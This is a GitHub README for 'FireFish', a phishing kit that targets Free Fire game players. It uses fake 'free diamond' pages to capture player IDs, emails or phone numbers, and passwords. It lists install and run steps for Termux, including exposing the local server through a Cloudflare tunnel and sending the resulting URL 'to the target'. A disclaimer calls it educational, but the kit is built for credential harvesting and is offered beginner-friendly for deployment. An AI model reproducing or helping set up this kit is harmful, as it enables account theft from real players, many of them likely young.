# 🐟 FireFish

⚠️ **WARNING & LEGAL DISCLAIMER — EDUCATIONAL USE ONLY — READ CAREFULLY**  
This repository is provided strictly for **educational, research, and authorized security‑testing purposes**.  
DO NOT use this project to:  
- Phish or harvest real credentials  
- Impersonate real brands, companies, or services  
- Target real users or accounts  
- Bypass security controls  
- Deploy on public servers without written authorization  

Unauthorized use may violate local, national, or international laws.

---

## 📘 About FireFish

**FireFish** is an educational phishing tool used for freefire it gives the access of information about playerid, phone/email, password 

---

## 🚀 Features

1.*Free Diamond stimulating web pages and social engineering factors for better result*

2.*Beginners freindly easy to understand*

3.*Uses cloudflare not using broken ngrok tunnel it fails and it is widely considered 🚩*

---
## 💭 Cloudflare Installation 
```
pkg update
pkg install wget
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64
chmod +x cloudflared-linux-arm64
mv cloudflared-linux-arm64 $PREFIX/bin/cloudflared
```

---
## 🛠 Installation

FireFish runs locally and can optionally be exposed using Cloudflare Tunnel.

### 1️⃣ Clone the Repository

```bash
git clone https://github.com/Adwaithpramod1/Project_FireFish.git
cd Project_FireFish
```
## Using
1. Start FireFish server On termux 
```bash
python FireFish.py
```
2. Start the Cloudflare Tunnel in new session of termux
3. and Start tunnel by executing below command
```
cloudflared tunnel --url http://localhost:8080
```
Copy the generated HTTPS URL.
And sent to the target
⚠️ Important: Only use Cloudflare Tunnel in safe, controlled, and authorized environments.
Do not use this URL to target real users.
